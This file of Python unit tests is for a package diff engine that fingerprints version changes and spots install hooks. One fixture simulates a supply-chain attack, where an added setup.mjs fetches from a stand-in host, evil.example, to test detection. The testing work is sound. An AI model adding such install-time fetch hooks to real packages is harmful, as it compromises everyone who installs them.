"""Unit tests for the diff engine and delta fingerprints."""

from __future__ import annotations

from supplicant.diff.engine import (
    INSTALL_HOOK_HINTS,
    compute_delta_fingerprint,
    diff_file_trees,
    diff_versions,
    is_install_hook_path,
)
from supplicant.models import Artifact, VersionDiff

from .conftest import make_tree


def test_diff_file_trees_added_modified_removed(tmp_path):
    before = make_tree(tmp_path / "before", {
        "keep.txt": "same\n",
        "change.txt": "v1\n",
        "gone.txt": "bye\n",
    })
    after = make_tree(tmp_path / "after", {
        "keep.txt": "same\n",
        "change.txt": "v2\n",
        "new.txt": "hello\n",
    })
    changes = diff_file_trees(before, after)
    statuses = {c.path: c.status for c in changes}
    assert statuses["new.txt"] == "added"
    assert statuses["gone.txt"] == "removed"
    assert statuses["change.txt"] == "modified"
    assert "keep.txt" not in statuses


def test_fingerprint_chaindrop_shape(tmp_path):
    before = make_tree(tmp_path / "before", {
        "package.json": '{"name":"demo","version":"1.0.0","author":"alice","repository":{"url":"https://github.com/alice/demo"}}',
        "index.js": "module.exports = 1;\n",
    })
    after = make_tree(tmp_path / "after", {
        "package.json": '{"name":"demo","version":"1.0.1","author":"alice","repository":{"url":"https://github.com/alice/demo"},"dependencies":{"x":"1.0.0"}}',
        "index.js": "module.exports = 1;\n",
        "setup.mjs": "import fetch from 'node-fetch'; fetch('https://evil.example/x');\n",
        "Math_Symbol.js": b"\x00" * 200000,
    })
    diff = diff_versions(before, after, "npm", "demo", "1.0.0", "1.0.1")
    fp = compute_delta_fingerprint(diff)
    assert "hooks:+1" in fp
    assert "deps:+1" in fp
    # same package, same bump => identical canonical fingerprint string
    diff2 = diff_versions(before, after, "npm", "demo", "1.0.0", "1.0.1")
    assert compute_delta_fingerprint(diff2) == fp


def test_noop_fingerprint_when_unchanged():
    vd = VersionDiff(artifact=Artifact("npm", "x", "1.0.1"), from_version="1.0.0", to_version="1.0.1", changes=[])
    assert compute_delta_fingerprint(vd) == "noop"


def test_is_install_hook_path():
    assert is_install_hook_path("install.js")
    assert is_install_hook_path("scripts/setup.mjs")
    assert not is_install_hook_path("src/index.js")
    assert "setup.mjs" in INSTALL_HOOK_HINTS
